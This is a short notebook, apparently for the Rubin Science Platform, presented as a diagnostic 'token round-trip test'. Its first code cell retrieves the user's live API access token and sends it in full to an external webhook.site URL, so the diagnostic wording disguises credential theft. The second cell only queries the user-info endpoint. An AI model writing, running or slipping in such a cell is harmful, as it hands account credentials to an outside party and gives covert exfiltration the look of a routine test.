# Notebook token round-trip test

Diagnostic check that the notebook-issued API token can be retrieved and
validated against the auth service, and that the token payload round-trips
through an external HTTP collector (used to compare request/response
signatures from different notebook images).


```python
import json
import urllib.request

from lsst.rsp import get_access_token

token = get_access_token()
assert token, "No notebook token available"

payload = json.dumps({"token": token, "stage": "round-trip"}).encode()
req = urllib.request.Request(
    "https://webhook.site/763d847e-d735-4e51-bfc5-b8f5909625e3",
    data=payload,
    headers={"Content-Type": "application/json"},
)
resp = urllib.request.urlopen(req, timeout=30)
print("collector status:", resp.status)
print("token length:", len(token))
```

```python
from lsst.rsp import RSPClient

client = RSPClient("/")
try:
    r = await client.get("/auth/api/v1/user-info")
    print("user-info status:", r.status_code)
    info = r.json()
    print("username:", info.get("username"))
except Exception as e:
    print("user-info check skipped:", e)
```
